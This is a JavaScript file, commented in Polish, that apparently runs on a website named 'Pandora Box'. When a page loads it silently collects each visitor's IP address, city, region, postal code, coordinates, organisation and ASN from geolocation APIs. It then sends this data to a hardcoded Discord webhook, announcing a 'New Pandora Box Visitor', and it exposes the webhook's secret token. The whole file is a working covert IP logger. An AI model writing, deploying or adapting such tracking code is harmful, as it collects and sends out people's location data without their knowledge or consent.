const WEBHOOK_URL = "https://discord.com/api/webhooks/1473802841083740358/Fa1WpPDsIQiDj6aNqjIJj1jXvn81VJZT7nvALQpr4BDDBFufLuaxpySl1tq0DXFVwtX1";

// Funkcja do pobrania szczegółowych danych IP
async function getDetailedIPInfo() {
    try {
        console.log('🔍 Fetching IP information...');
        
        // Używamy ipapi.co dla lepszych danych (w tym ulicy dla Polski)
        const response = await fetch('https://ipapi.co/json/', {
            method: 'GET'
        });
        
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        
        const data = await response.json();
        console.log('✅ IP data received:', data);
        return data;
    } catch (error) {
        console.error('❌ Error fetching IP info:', error);
        // Fallback do ip-api.com
        try {
            console.log('🔄 Trying alternative API...');
            const fallbackResponse = await fetch('https://ip-api.com/json/?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,query', {
                method: 'GET'
            });
            const fallbackData = await fallbackResponse.json();
            console.log('✅ Fallback data received:', fallbackData);
            return {
                ip: fallbackData.query,
                country_name: fallbackData.country,
                country_code: fallbackData.countryCode,
                city: fallbackData.city,
                region: fallbackData.regionName,
                postal: fallbackData.zip,
                latitude: fallbackData.lat,
                longitude: fallbackData.lon
            };
        } catch (fallbackError) {
            console.error('❌ Fallback also failed:', fallbackError);
            return null;
        }
    }
}

// Funkcja do wysłania danych na Discord
async function sendToDiscord(ipData) {
    try {
        console.log('📤 Preparing webhook payload...');
        
        // Sprawdź czy to Polska
        const isPoland = ipData.country_code === 'PL' || ipData.country_name === 'Poland';
        
        // Przygotuj pola do embedu
        const fields = [
            {
                name: "🌐 IP Address",
                value: ipData.ip || 'Unknown',
                inline: true
            },
            {
                name: "🌍 Country",
                value: ipData.country_name || 'Unknown',
                inline: true
            },
            {
                name: "🏙️ City",
                value: ipData.city || 'Unknown',
                inline: true
            },
            {
                name: "📍 Region",
                value: ipData.region || 'Unknown',
                inline: true
            },
            {
                name: "📮 ZIP Code",
                value: ipData.postal || 'Unknown',
                inline: true
            },
            {
                name: "🗺️ Coordinates",
                value: ipData.latitude && ipData.longitude 
                    ? `${ipData.latitude}, ${ipData.longitude}` 
                    : 'Unknown',
                inline: true
            }
        ];
        
        // Dodaj ulicę jeśli to Polska i jest dostępna
        if (isPoland) {
            if (ipData.org) {
                fields.push({
                    name: "🏢 Organization",
                    value: ipData.org,
                    inline: false
                });
            }
            if (ipData.asn) {
                fields.push({
                    name: "🔢 ASN",
                    value: ipData.asn,
                    inline: true
                });
            }
        }
        
        // Dodaj timestamp
        const timestamp = new Date().toISOString();
        
        const webhookPayload = {
            content: "🚨 **New Pandora Box Visitor**",
            embeds: [{
                title: "📊 Visitor Information",
                color: 0xBA0000,
                description: isPoland ? "🇵🇱 **Visitor from Poland detected!**" : "Visitor IP information",
                fields: fields,
                footer: {
                    text: "Programmed by prod.orzech | Pandora Box",
                    icon_url: "https://media.discordapp.net/attachments/1241105227826855997/1473801023326912716/ChatGPT_Image_17_lut_2026_17_29_12.png"
                },
                thumbnail: {
                    url: "https://media.discordapp.net/attachments/1241105227826855997/1473801023326912716/ChatGPT_Image_17_lut_2026_17_29_12.png"
                },
                timestamp: timestamp
            }]
        };
        
        console.log('📤 Sending webhook...', webhookPayload);
        
        const webhookResponse = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(webhookPayload)
        });
        
        if (webhookResponse.ok) {
            console.log('✅ Webhook sent successfully!', webhookResponse.status);
        } else {
            const errorText = await webhookResponse.text();
            console.error('❌ Webhook failed:', webhookResponse.status, errorText);
        }
        
    } catch (error) {
        console.error('❌ Error sending webhook:', error);
    }
}

// Główna funkcja - uruchamiana automatycznie
(async function init() {
    try {
        console.log('🚀 Starting IP tracking...');
        
        const ipData = await getDetailedIPInfo();
        
        if (ipData && ipData.ip) {
            await sendToDiscord(ipData);
            console.log('✅ Tracking completed successfully!');
        } else {
            console.error('❌ No IP data available');
        }
        
    } catch (error) {
        console.error('❌ Fatal error:', error);
    }
})();
